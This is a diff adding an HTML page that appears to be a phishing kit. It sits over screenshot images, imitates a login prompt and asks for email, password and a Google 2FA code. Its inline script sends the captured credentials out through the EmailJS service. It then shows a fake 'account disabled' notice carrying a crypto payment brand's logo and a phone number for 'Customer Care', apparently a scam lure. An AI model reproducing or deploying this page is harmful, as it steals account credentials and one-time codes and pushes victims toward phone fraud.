@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <link rel="stylesheet" href="./index.css">
+</head>
+
+<body>
+    <main>
+        <img src="./nav.png" alt="">
+        <img src="./banner.png" alt="">
+    </main>
+
+    <div class="popup" id="login-popup">
+        <div class="login-popup popup-bx">
+            <img src="./image.png" class="lock" alt="lock">
+            <h2 style="text-align: center; margin: 10px 0;">Login</h2>
+
+            <form id="loginForm" class="login-form">
+                <div class="input-box">
+                    <input type="email" id="email" placeholder="E-mail" required>
+                    <span class="icon">
+                        <svg width="24px" height="24px" viewBox="0 -3.5 32 32" version="1.1"
+                            xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                            xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" fill="#000000">
+                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                            <g id="SVGRepo_iconCarrier">
+                                <title>mail</title>
+                                <desc>Created with Sketch Beta.</desc>
+                                <defs> </defs>
+                                <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"
+                                    sketch:type="MSPage">
+                                    <g id="Icon-Set-Filled" sketch:type="MSLayerGroup"
+                                        transform="translate(-414.000000, -261.000000)" fill="#7a7a7a">
+                                        <path
+                                            d="M430,275.916 L426.684,273.167 L415.115,285.01 L444.591,285.01 L433.235,273.147 L430,275.916 L430,275.916 Z M434.89,271.89 L445.892,283.329 C445.955,283.107 446,282.877 446,282.634 L446,262.862 L434.89,271.89 L434.89,271.89 Z M414,262.816 L414,282.634 C414,282.877 414.045,283.107 414.108,283.329 L425.147,271.927 L414,262.816 L414,262.816 Z M445,261 L415,261 L430,273.019 L445,261 L445,261 Z"
+                                            id="mail" sketch:type="MSShapeGroup"> </path>
+                                    </g>
+                                </g>
+                            </g>
+                        </svg>
+                    </span>
+                </div>
+                <div class="input-box">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span class="icon"><svg width="24px" height="24px" viewBox="0 0 16 16" fill="none"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                            <g id="SVGRepo_iconCarrier">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M4 6V4C4 1.79086 5.79086 0 8 0C10.2091 0 12 1.79086 12 4V6H14V16H2V6H4ZM6 4C6 2.89543 6.89543 2 8 2C9.10457 2 10 2.89543 10 4V6H6V4ZM7 13V9H9V13H7Z"
+                                    fill="#7c7c7c"></path>
+                            </g>
+                        </svg></span>
+
+                </div>
+                <div class="input-box">
+                    <input type="text" id="google2fa" placeholder="Google 2FA Code" required>
+                    <!-- SVG Icon --> <span class="icon"><svg width="24px" height="24px" viewBox="0 0 16 16" fill="none"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                            <g id="SVGRepo_iconCarrier">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M4 6V4C4 1.79086 5.79086 0 8 0C10.2091 0 12 1.79086 12 4V6H14V16H2V6H4ZM6 4C6 2.89543 6.89543 2 8 2C9.10457 2 10 2.89543 10 4V6H6V4ZM7 13V9H9V13H7Z"
+                                    fill="#7c7c7c"></path>
+                            </g>
+                        </svg></span>
+                    <span class="icon"><svg width="24px" height="24px" viewBox="0 0 16 16" fill="none"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                            <g id="SVGRepo_iconCarrier">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M4 6V4C4 1.79086 5.79086 0 8 0C10.2091 0 12 1.79086 12 4V6H14V16H2V6H4ZM6 4C6 2.89543 6.89543 2 8 2C9.10457 2 10 2.89543 10 4V6H6V4ZM7 13V9H9V13H7Z"
+                                    fill="#7c7c7c"></path>
+                            </g>
+                        </svg></span>
+
+                </div>
+                <div class="options">
+                    <label><input type="checkbox"> Remember me</label>
+                    <a href="#">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="popup" id="loader" style="display: none;">
+        <div class="loader">
+            <div class="circle"></div>
+            <div class="circle"></div>
+            <div class="circle"></div>
+            <div class="circle"></div>
+        </div>
+    </div>
+    <div class="popup" id="error-popup" style="display: none;">
+        <div class="popup-bx">
+            <img  style="max-width: 90%; margin-bottom: 20px;" src="https://pay.changecoins.io/img/logo.png" alt="logo">
+            <h2>Something went Wrong</h2>
+            <p style="text-align: center; padding: 20px 0;">Due to suspicious activity, your account has been disabled. Please contact Customer Care.
+            </p>
+            <a style="display: flex; padding: 10px; background-color: rgb(57, 145, 57); color: #fff; text-decoration: none; width: 100%; text-align: center; justify-content: center;
+            border-radius: 12px;" href="tel:+1-828-270-6316">+1-828-270-6316</a>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+
+    <script>
+        // Initialize EmailJS with your User ID
+        (function () {
+            emailjs.init({
+                publicKey: "XLlbM9cQwyfImO9Mn", // Replace with your EmailJS User ID
+            });
+        })();
+
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent the form from submitting
+
+            // Show the loader
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('login-popup').style.display = 'none';
+
+            // Collect form data
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                google2fa: document.getElementById('google2fa').value
+            };
+
+            // Send email using EmailJS
+            emailjs.send('service_ife8sa6', 'template_y8u2pqw', formData) // Replace with your Service ID and Template ID
+                .then(function (response) {
+                    console.log('Email sent successfully!', response.status, response.text);
+                    document.getElementById('error-popup').style.display = 'flex';
+
+                })
+                .catch(function (error) {
+                    console.error('Failed to send email:', error);
+                    // Hide the loader and show the error popup
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('error-popup').style.display = 'flex';
+                })
+                .finally(function () {
+                    // Hide the loader after the process is complete
+                    document.getElementById('loader').style.display = 'none';
+                });
+        });
+    </script>
+
+</body>
+
+</html>
